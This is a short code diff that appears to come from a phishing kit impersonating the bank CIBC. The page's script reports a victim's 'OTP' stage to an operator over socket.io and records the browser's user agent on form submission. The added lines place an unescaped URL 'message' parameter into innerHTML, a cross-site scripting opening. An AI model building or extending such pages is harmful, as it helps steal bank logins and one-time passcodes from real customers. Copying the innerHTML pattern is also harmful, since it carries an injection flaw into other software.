@@ -187,7 +187,19 @@
                     const socket = io();
 
          socket.emit('pageandstage', {page: 'CIBC', stage: 'OTP'})
-    
+    // JavaScript on the /otp page
+document.addEventListener('DOMContentLoaded', function() {
+    let params = new URLSearchParams(window.location.search);
+    let message = params.get('message');
+
+    if (message) {
+        displayMessage(message);
+    }
+});
+
+function displayMessage(message) {
+   document.getElementById("alertWrong").innerHTML = message;
+}
     function submitForm() {
         document.getElementById('userAgent').value = navigator.userAgent;
     
